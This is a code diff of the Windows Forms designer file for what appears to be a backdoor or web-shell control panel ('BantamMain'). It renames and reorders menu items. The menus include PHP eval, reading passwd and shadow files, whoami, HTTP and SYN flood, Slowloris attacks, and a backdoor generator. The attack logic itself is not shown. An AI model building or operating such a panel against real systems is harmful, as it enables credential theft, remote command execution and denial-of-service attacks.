@@ -29,7 +29,7 @@
         private void InitializeComponent()
         {
             this.components = new System.ComponentModel.Container();
-            System.Windows.Forms.ColumnHeader hostColHeader;
+            System.Windows.Forms.ColumnHeader hostTargetColHeader;
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BantamMain));
             this.listViewClients = new System.Windows.Forms.ListView();
             this.pingColHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -42,24 +42,23 @@
             this.windowsNetuserMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.windowsNetaccountsMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.windowsIpconfigMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.windowsHostsMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.windowshostTargetsMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.windowsVerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.linuxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.linuxIfconfigMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.linuxInterfacesMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.linusVersionMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.linuxHostsMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.linuxhostTargetsMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.linuxIssuenetMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.passwdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.shadowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.whoamiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.psAuxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.pingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.whoamiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.attackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.hTTPFloodToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.sYNFloodToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.slolorisToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.fileBrowserToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.softwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.apacheToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.nginxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -108,7 +107,7 @@
             this.imageListFileBrowser = new System.Windows.Forms.ImageList(this.components);
             this.imageList1 = new System.Windows.Forms.ImageList(this.components);
             this.splitContainer1 = new System.Windows.Forms.SplitContainer();
-            hostColHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            hostTargetColHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.listviewClientsContextMenu.SuspendLayout();
             this.mainMenuStrip.SuspendLayout();
             this.tabControl1.SuspendLayout();
@@ -121,10 +120,10 @@
             this.splitContainer1.SuspendLayout();
             this.SuspendLayout();
             // 
-            // hostColHeader
+            // hostTargetColHeader
             // 
-            hostColHeader.Text = "Host";
-            hostColHeader.Width = 148;
+            hostTargetColHeader.Text = "Host";
+            hostTargetColHeader.Width = 148;
             // 
             // listViewClients
             // 
@@ -132,7 +131,7 @@
             | System.Windows.Forms.AnchorStyles.Left) 
             | System.Windows.Forms.AnchorStyles.Right)));
             this.listViewClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            hostColHeader,
+            hostTargetColHeader,
             this.pingColHeader});
             this.listViewClients.ContextMenuStrip = this.listviewClientsContextMenu;
             this.listViewClients.FullRowSelect = true;
@@ -157,10 +156,9 @@
             this.phpToolStripMenuItem,
             this.systemToolstripMenuItem,
             this.attackToolStripMenuItem,
-            this.fileBrowserToolStripMenuItem,
             this.softwareToolStripMenuItem});
             this.listviewClientsContextMenu.Name = "listViewContextMenuStrip";
-            this.listviewClientsContextMenu.Size = new System.Drawing.Size(138, 114);
+            this.listviewClientsContextMenu.Size = new System.Drawing.Size(121, 92);
             // 
             // phpToolStripMenuItem
             // 
@@ -168,20 +166,20 @@
             this.phpinfoToolStripMenuItem,
             this.evalToolStripMenuItem});
             this.phpToolStripMenuItem.Name = "phpToolStripMenuItem";
-            this.phpToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.phpToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
             this.phpToolStripMenuItem.Text = "PHP";
             // 
             // phpinfoToolStripMenuItem
             // 
             this.phpinfoToolStripMenuItem.Name = "phpinfoToolStripMenuItem";
-            this.phpinfoToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.phpinfoToolStripMenuItem.Size = new System.Drawing.Size(116, 22);
             this.phpinfoToolStripMenuItem.Text = "phpinfo";
             this.phpinfoToolStripMenuItem.Click += new System.EventHandler(this.phpinfoToolStripMenuItem_Click);
             // 
             // evalToolStripMenuItem
             // 
             this.evalToolStripMenuItem.Name = "evalToolStripMenuItem";
-            this.evalToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.evalToolStripMenuItem.Size = new System.Drawing.Size(116, 22);
             this.evalToolStripMenuItem.Text = "eval";
             this.evalToolStripMenuItem.Click += new System.EventHandler(this.evalToolStripMenuItem_Click);
             // 
@@ -191,9 +189,10 @@
             this.windowsToolStripMenuItem,
             this.linuxToolStripMenuItem,
             this.psAuxToolStripMenuItem,
-            this.pingToolStripMenuItem});
+            this.pingToolStripMenuItem,
+            this.whoamiToolStripMenuItem});
             this.systemToolstripMenuItem.Name = "systemToolstripMenuItem";
-            this.systemToolstripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.systemToolstripMenuItem.Size = new System.Drawing.Size(137, 22);
             this.systemToolstripMenuItem.Text = "System";
             // 
             // windowsToolStripMenuItem
@@ -202,7 +201,7 @@
             this.windowsNetuserMenuItem,
             this.windowsNetaccountsMenuItem,
             this.windowsIpconfigMenuItem,
-            this.windowsHostsMenuItem,
+            this.windowshostTargetsMenuItem,
             this.windowsVerToolStripMenuItem});
             this.windowsToolStripMenuItem.Name = "windowsToolStripMenuItem";
             this.windowsToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
@@ -229,12 +228,12 @@
             this.windowsIpconfigMenuItem.Text = "ipconfig";
             this.windowsIpconfigMenuItem.Click += new System.EventHandler(this.windowsIpconfigMenuItem_Click);
             // 
-            // windowsHostsMenuItem
+            // windowshostTargetsMenuItem
             // 
-            this.windowsHostsMenuItem.Name = "windowsHostsMenuItem";
-            this.windowsHostsMenuItem.Size = new System.Drawing.Size(142, 22);
-            this.windowsHostsMenuItem.Text = "hosts";
-            this.windowsHostsMenuItem.Click += new System.EventHandler(this.windowsHostsMenuItem_Click);
+            this.windowshostTargetsMenuItem.Name = "windowshostTargetsMenuItem";
+            this.windowshostTargetsMenuItem.Size = new System.Drawing.Size(142, 22);
+            this.windowshostTargetsMenuItem.Text = "hostTargets";
+            this.windowshostTargetsMenuItem.Click += new System.EventHandler(this.windowsTargetsMenuItem_Click);
             // 
             // windowsVerToolStripMenuItem
             // 
@@ -249,11 +248,10 @@
             this.linuxIfconfigMenuItem,
             this.linuxInterfacesMenuItem,
             this.linusVersionMenuItem,
-            this.linuxHostsMenuItem,
+            this.linuxhostTargetsMenuItem,
             this.linuxIssuenetMenuItem,
             this.passwdToolStripMenuItem,
-            this.shadowToolStripMenuItem,
-            this.whoamiToolStripMenuItem});
+            this.shadowToolStripMenuItem});
             this.linuxToolStripMenuItem.Name = "linuxToolStripMenuItem";
             this.linuxToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
             this.linuxToolStripMenuItem.Text = "Linux";
@@ -279,12 +277,12 @@
             this.linusVersionMenuItem.Text = "version";
             this.linusVersionMenuItem.Click += new System.EventHandler(this.linusVersionMenuItem_Click);
             // 
-            // linuxHostsMenuItem
+            // linuxhostTargetsMenuItem
             // 
-            this.linuxHostsMenuItem.Name = "linuxHostsMenuItem";
-            this.linuxHostsMenuItem.Size = new System.Drawing.Size(125, 22);
-            this.linuxHostsMenuItem.Text = "hosts";
-            this.linuxHostsMenuItem.Click += new System.EventHandler(this.linuxHostsMenuItem_Click);
+            this.linuxhostTargetsMenuItem.Name = "linuxhostTargetsMenuItem";
+            this.linuxhostTargetsMenuItem.Size = new System.Drawing.Size(125, 22);
+            this.linuxhostTargetsMenuItem.Text = "hosts";
+            this.linuxhostTargetsMenuItem.Click += new System.EventHandler(this.linuxhostsMenuItem_Click);
             // 
             // linuxIssuenetMenuItem
             // 
@@ -298,21 +296,14 @@
             this.passwdToolStripMenuItem.Name = "passwdToolStripMenuItem";
             this.passwdToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.passwdToolStripMenuItem.Text = "passwd";
-            this.passwdToolStripMenuItem.Click += new System.EventHandler(this.passwdToolStripMenuItem_Click_1);
+            this.passwdToolStripMenuItem.Click += new System.EventHandler(this.passwdToolStripMenuItem_Click);
             // 
             // shadowToolStripMenuItem
             // 
             this.shadowToolStripMenuItem.Name = "shadowToolStripMenuItem";
             this.shadowToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.shadowToolStripMenuItem.Text = "shadow";
-            this.shadowToolStripMenuItem.Click += new System.EventHandler(this.shadowToolStripMenuItem_Click_1);
-            // 
-            // whoamiToolStripMenuItem
-            // 
-            this.whoamiToolStripMenuItem.Name = "whoamiToolStripMenuItem";
-            this.whoamiToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
-            this.whoamiToolStripMenuItem.Text = "whoami";
-            this.whoamiToolStripMenuItem.Click += new System.EventHandler(this.whoamiToolStripMenuItem_Click);
+            this.shadowToolStripMenuItem.Click += new System.EventHandler(this.shadowToolStripMenuItem_Click);
             // 
             // psAuxToolStripMenuItem
             // 
@@ -328,6 +319,13 @@
             this.pingToolStripMenuItem.Text = "ping";
             this.pingToolStripMenuItem.Click += new System.EventHandler(this.pingToolStripMenuItem_Click);
             // 
+            // whoamiToolStripMenuItem
+            // 
+            this.whoamiToolStripMenuItem.Name = "whoamiToolStripMenuItem";
+            this.whoamiToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
+            this.whoamiToolStripMenuItem.Text = "whoami";
+            this.whoamiToolStripMenuItem.Click += new System.EventHandler(this.whoamiToolStripMenuItem_Click);
+            // 
             // attackToolStripMenuItem
             // 
             this.attackToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -335,7 +333,7 @@
             this.sYNFloodToolStripMenuItem1,
             this.slolorisToolStripMenuItem});
             this.attackToolStripMenuItem.Name = "attackToolStripMenuItem";
-            this.attackToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.attackToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
             this.attackToolStripMenuItem.Text = "Attack";
             // 
             // hTTPFloodToolStripMenuItem1
@@ -356,13 +354,6 @@
             this.slolorisToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
             this.slolorisToolStripMenuItem.Text = "Slowloris";
             // 
-            // fileBrowserToolStripMenuItem
-            // 
-            this.fileBrowserToolStripMenuItem.Name = "fileBrowserToolStripMenuItem";
-            this.fileBrowserToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
-            this.fileBrowserToolStripMenuItem.Text = "File Browser";
-            this.fileBrowserToolStripMenuItem.Click += new System.EventHandler(this.fileBrowserToolStripMenuItem_Click);
-            // 
             // softwareToolStripMenuItem
             // 
             this.softwareToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -371,7 +362,7 @@
             this.sambaToolStripMenuItem,
             this.mysqlToolStripMenuItem});
             this.softwareToolStripMenuItem.Name = "softwareToolStripMenuItem";
-            this.softwareToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.softwareToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
             this.softwareToolStripMenuItem.Text = "Software";
             // 
             // apacheToolStripMenuItem
@@ -425,12 +416,14 @@
             this.addToolStripMenuItem.Name = "addToolStripMenuItem";
             this.addToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
             this.addToolStripMenuItem.Text = "Add Client";
+            this.addToolStripMenuItem.Click += new System.EventHandler(this.addToolStripMenuItem_Click);
             // 
             // pingClientsToolStripMenuItem
             // 
             this.pingClientsToolStripMenuItem.Name = "pingClientsToolStripMenuItem";
             this.pingClientsToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
             this.pingClientsToolStripMenuItem.Text = "Ping All Clients";
+            this.pingClientsToolStripMenuItem.Click += new System.EventHandler(this.pingClientsToolStripMenuItem_Click);
             // 
             // backdoorGeneratorStripMenuItem
             // 
@@ -680,7 +673,7 @@
             this.tabPageFiles.Location = new System.Drawing.Point(4, 22);
             this.tabPageFiles.Name = "tabPageFiles";
             this.tabPageFiles.Padding = new System.Windows.Forms.Padding(3);
-            this.tabPageFiles.Size = new System.Drawing.Size(476, 399);
+            this.tabPageFiles.Size = new System.Drawing.Size(476, 394);
             this.tabPageFiles.TabIndex = 1;
             this.tabPageFiles.Text = "File Browser";
             this.tabPageFiles.UseVisualStyleBackColor = true;
@@ -871,7 +864,6 @@
         private System.Windows.Forms.ToolStripMenuItem hTTPFloodToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem sYNFloodToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem slolorisToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem fileBrowserToolStripMenuItem;
         private System.Windows.Forms.TabControl tabControl1;
         private System.Windows.Forms.TabPage tabPageInfo;
         private System.Windows.Forms.TabPage tabPageFiles;
@@ -895,10 +887,10 @@
         private System.Windows.Forms.ToolStripMenuItem linuxToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem linuxIfconfigMenuItem;
         private System.Windows.Forms.ToolStripMenuItem linuxInterfacesMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem windowsHostsMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem windowshostTargetsMenuItem;
         private System.Windows.Forms.ToolStripMenuItem windowsVerToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem linusVersionMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem linuxHostsMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem linuxhostTargetsMenuItem;
         private System.Windows.Forms.ToolStripMenuItem linuxIssuenetMenuItem;
         private System.Windows.Forms.ToolStripMenuItem passwdToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem shadowToolStripMenuItem;
@@ -907,7 +899,6 @@
         private System.Windows.Forms.ToolStripMenuItem nginxToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem sambaToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem mysqlToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem whoamiToolStripMenuItem;
         private System.Windows.Forms.Label lblStaticFreeHDD;
         private System.Windows.Forms.Label lblStaticHDD;
         private System.Windows.Forms.Label lblStaticPHP;
@@ -927,6 +918,7 @@
         private System.Windows.Forms.Label lblDynGroup;
         private System.Windows.Forms.Label lblStaticGroup;
         private System.Windows.Forms.SplitContainer splitContainer1;
+        private System.Windows.Forms.ToolStripMenuItem whoamiToolStripMenuItem;
     }
 }
 
